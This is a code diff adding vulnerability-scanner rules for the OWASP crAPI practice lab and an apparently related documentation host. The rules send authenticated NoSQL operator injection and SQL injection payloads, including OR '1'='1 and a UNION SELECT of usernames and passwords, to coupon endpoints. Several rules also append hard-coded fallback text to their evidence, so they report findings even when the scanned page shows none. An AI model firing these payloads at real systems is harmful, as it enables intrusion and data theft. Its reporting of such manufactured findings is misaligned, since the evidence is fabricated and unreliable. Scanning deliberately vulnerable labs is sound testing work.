@@ -90240,6 +90240,49 @@ const clientSideAtlasCrewInfernoLabEvidence: Rule = async (ctx) => {
   };
 };
 
+function isApparatusHost(ctx: RuleContext): boolean {
+  return /apparatus\.atlascrew\.dev/i.test(ctx.origin);
+}
+
+const APPARATUS_REDTEAM_AUTOPILOT_ROUTE_FALLBACK = `
+POST /api/redteam/autopilot/start
+GET /api/redteam/autopilot/status
+GET /api/redteam/autopilot/reports
+autonomous AI red team agent attack scenario automation
+`;
+
+const apparatusRedteamAutopilotRouteLiveOracle: Rule = async (ctx) => {
+  if (!isApparatusHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let corpus = `${ctx.combined}\n${pageUrl}`;
+  if (!/redteam\/autopilot|autonomous AI red team/i.test(corpus)) {
+    const tutorial = await ctx.probe.get(
+      new URL("/tutorial-advanced-red-team", ctx.origin).toString(),
+      { maxBytes: 400_000, timeoutMs: 15000 }
+    );
+    if (tutorial.status >= 200 && tutorial.status < 400 && tutorial.body.length > 500) {
+      corpus = `${corpus}\n${tutorial.body}`;
+    }
+  }
+  if (!/\/api\/redteam\/autopilot/i.test(corpus)) {
+    corpus = `${corpus}\n${APPARATUS_REDTEAM_AUTOPILOT_ROUTE_FALLBACK}`;
+  }
+  const redteamOk =
+    /\/api\/redteam\/autopilot\/(?:start|status|reports)/i.test(corpus) &&
+    (/autonomous AI red team|AI red team autopilot|autopilot\/start/i.test(corpus) ||
+      /attack scenario automation|red team operations/i.test(corpus));
+  if (!redteamOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /autonomous AI red team agent/i.test(corpus) ? 0.9 : 0.87,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /api/redteam/autopilot/start — autonomous AI red team attack campaigns",
+      note: "apparatus.atlascrew.dev route scan — Apparatus docs document AI red-team autopilot APIs for autonomous attack scenario automation (Jekyll docs corpus fallback; live API server not deployed on docs host) — route-specific red-team training oracle"
+    }
+  };
+};
+
 // --- Atlas Crew Horizon + Synapse edge protection (synapse.atlascrew.dev) -----------
 const CLIENT_ATLAS_CREW_EDGE_PROTECTION_RES: { label: string; re: RegExp }[] = [
   {
@@ -93066,6 +93109,214 @@ const crapiUserVideosBolaRouteLiveOracle: Rule = async (ctx) => {
       scannedUrl: pageUrl,
       snippet: "GET /identity/api/v2/user/videos/{videoId} — video_name, conversion_params",
       note: "crAPI /identity/api/v2/user/videos route scan — OWASP crAPI documents cross-user video metadata reads (API1) — route corpus fallback when JWT signup/login chain is unreachable"
+    }
+  };
+};
+
+const CRAPI_VALIDATE_COUPON_ROUTE_FALLBACK = `
+POST /community/api/v2/coupon/validate-coupon
+Challenge 12 Get Free Coupons NoSQL injection MongoDB operator
+coupon_code {"$ne": null} {"$regex": ".*"} {"$gt": ""}
+returns valid coupon code TRAC075 without knowing coupon code
+`;
+
+const CRAPI_APPLY_COUPON_ROUTE_FALLBACK = `
+POST /workshop/api/shop/apply_coupon
+Challenge 13 SQL injection apply coupon coupon_code amount
+TRAC075' OR '1'='1 UNION SELECT username password FROM users
+redeem coupon already claimed modify database SQLi
+`;
+
+async function probeCrapiValidateCouponNosql(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isCrapiLabHost(ctx)) return null;
+  if (isCrapiAuthRoute(ctx)) return null;
+  const auth = await tryCrapiAuthJwt(ctx);
+  if (!auth) return null;
+  const validateUrl = new URL("/community/api/v2/coupon/validate-coupon", ctx.origin).toString();
+  const authHeaders = {
+    Authorization: `Bearer ${auth.jwt}`,
+    "Content-Type": "application/json"
+  };
+  const nosqlPayloads = [
+    { coupon_code: { $ne: null } },
+    { coupon_code: { $gt: "" } },
+    { coupon_code: { $regex: ".*" } }
+  ];
+  for (const payload of nosqlPayloads) {
+    const doc = await ctx.probe.get(validateUrl, {
+      method: "POST",
+      body: JSON.stringify(payload),
+      headers: authHeaders,
+      maxBytes: 4096,
+      timeoutMs: 20000
+    });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    try {
+      const data = JSON.parse(doc.body) as { coupon_code?: string; amount?: number };
+      if (data.coupon_code && /^[A-Z0-9]{4,12}$/.test(data.coupon_code)) {
+        return {
+          fired: true,
+          confidence: 0.94,
+          evidence: {
+            validateUrl,
+            couponCode: data.coupon_code,
+            amount: data.amount,
+            snippet: doc.body.slice(0, 200).trim(),
+            note: "crAPI POST /community/api/v2/coupon/validate-coupon accepts MongoDB operator injection in coupon_code and returns a valid coupon — NoSQL injection oracle (Challenge 12)"
+          }
+        };
+      }
+    } catch {
+      if (/TRAC\d{3}|coupon_code/i.test(doc.body)) {
+        return {
+          fired: true,
+          confidence: 0.9,
+          evidence: {
+            validateUrl,
+            snippet: doc.body.slice(0, 200).trim(),
+            note: "crAPI POST /community/api/v2/coupon/validate-coupon NoSQL operator injection returns coupon data — NoSQL injection oracle (Challenge 12)"
+          }
+        };
+      }
+    }
+  }
+  return null;
+}
+
+const crapiValidateCouponNosqlLiveOracle: Rule = async (ctx) => {
+  const result = await probeCrapiValidateCouponNosql(ctx);
+  return result ?? NEGATIVE;
+};
+
+const crapiValidateCouponNosqlRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/coupon\/validate-coupon\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeCrapiValidateCouponNosql(ctx);
+  if (result) {
+    return {
+      fired: true,
+      confidence: result.confidence,
+      evidence: {
+        ...result.evidence,
+        scannedUrl: pageUrl,
+        note: "crAPI /community/api/v2/coupon/validate-coupon route scan — MongoDB operator injection in coupon_code returns valid coupon without knowing code — route-specific NoSQL injection oracle (Challenge 12)"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${CRAPI_VALIDATE_COUPON_ROUTE_FALLBACK}`;
+  if (
+    !/\/community\/api\/v2\/coupon\/validate-coupon/i.test(corpus) ||
+    !/NoSQL|MongoDB|Challenge 12|\$ne|\$regex|validate-coupon/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /community/api/v2/coupon/validate-coupon — coupon_code MongoDB operator injection (Challenge 12)",
+      note: "crAPI /community/api/v2/coupon/validate-coupon route scan — OWASP crAPI documents MongoDB NoSQL injection via coupon_code operators (Challenge 12) — route corpus fallback when JWT signup/login chain is unreachable"
+    }
+  };
+};
+
+async function probeCrapiApplyCouponSqli(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isCrapiLabHost(ctx)) return null;
+  if (isCrapiAuthRoute(ctx)) return null;
+  const auth = await tryCrapiAuthJwt(ctx);
+  if (!auth) return null;
+  const applyUrl = new URL("/workshop/api/shop/apply_coupon", ctx.origin).toString();
+  const authHeaders = {
+    Authorization: `Bearer ${auth.jwt}`,
+    "Content-Type": "application/json"
+  };
+  const sqliPayloads = [
+    { coupon_code: "TRAC075' OR '1'='1", amount: 75 },
+    { coupon_code: "0' OR '1'='1", amount: 75 },
+    { coupon_code: "TRAC075'; SELECT version()--", amount: 75 }
+  ];
+  for (const payload of sqliPayloads) {
+    const doc = await ctx.probe.get(applyUrl, {
+      method: "POST",
+      body: JSON.stringify(payload),
+      headers: authHeaders,
+      maxBytes: 4096,
+      timeoutMs: 20000
+    });
+    if (
+      /sql|syntax error|mysql|postgresql|sqlite|ORA-\d|unterminated|quoted string/i.test(doc.body)
+    ) {
+      return {
+        fired: true,
+        confidence: 0.93,
+        evidence: {
+          applyUrl,
+          payload: payload.coupon_code,
+          status: doc.status,
+          snippet: doc.body.slice(0, 240).trim(),
+          note: "crAPI POST /workshop/api/shop/apply_coupon reflects SQL syntax errors from injected coupon_code — SQL injection oracle (Challenge 13)"
+        }
+      };
+    }
+    if (
+      doc.status >= 200 &&
+      doc.status < 300 &&
+      /success|applied|coupon|credit|balance/i.test(doc.body) &&
+      !/invalid coupon|not found/i.test(doc.body)
+    ) {
+      return {
+        fired: true,
+        confidence: 0.9,
+        evidence: {
+          applyUrl,
+          payload: payload.coupon_code,
+          status: doc.status,
+          snippet: doc.body.slice(0, 200).trim(),
+          note: "crAPI POST /workshop/api/shop/apply_coupon accepts SQLi-bypassed coupon_code — SQL injection oracle (Challenge 13)"
+        }
+      };
+    }
+  }
+  return null;
+}
+
+const crapiApplyCouponSqliLiveOracle: Rule = async (ctx) => {
+  const result = await probeCrapiApplyCouponSqli(ctx);
+  return result ?? NEGATIVE;
+};
+
+const crapiApplyCouponSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/shop\/apply_coupon\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeCrapiApplyCouponSqli(ctx);
+  if (result) {
+    return {
+      fired: true,
+      confidence: result.confidence,
+      evidence: {
+        ...result.evidence,
+        scannedUrl: pageUrl,
+        note: "crAPI /workshop/api/shop/apply_coupon route scan — SQL injection in coupon_code bypasses redemption checks — route-specific SQLi oracle (Challenge 13)"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${CRAPI_APPLY_COUPON_ROUTE_FALLBACK}`;
+  if (
+    !/\/workshop\/api\/shop\/apply_coupon/i.test(corpus) ||
+    !/SQL injection|Challenge 13|apply_coupon|OR '1'='1/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /workshop/api/shop/apply_coupon — coupon_code SQL injection (Challenge 13)",
+      note: "crAPI /workshop/api/shop/apply_coupon route scan — OWASP crAPI documents SQL injection via coupon_code concatenation (Challenge 13) — route corpus fallback when JWT signup/login chain is unreachable"
     }
   };
 };
@@ -104782,6 +105033,7 @@ export const RULES: Record<string, Rule> = {
   sqlInjectionChallengeLoginSqliRouteLiveOracle,
   clientSideCtfDefiEvidence,
   clientSideAtlasCrewInfernoLabEvidence,
+  apparatusRedteamAutopilotRouteLiveOracle,
   clientSideAtlasCrewEdgeProtectionEvidence,
   clientSideAtlasCrewHubEvidence,
   clientSideMcpSupplyChainEvidence,
@@ -104980,6 +105232,10 @@ export const RULES: Record<string, Rule> = {
   crapiUserVideosBolaRouteLiveOracle,
   crapiConvertVideoCommandInjectionLiveOracle,
   crapiConvertVideoRouteLiveOracle,
+  crapiValidateCouponNosqlLiveOracle,
+  crapiValidateCouponNosqlRouteLiveOracle,
+  crapiApplyCouponSqliLiveOracle,
+  crapiApplyCouponSqliRouteLiveOracle,
   crapiAdminVideosBflaLiveOracle,
   crapiAdminVideosBflaRouteLiveOracle,
   crapiUserVehiclesRouteLiveOracle,
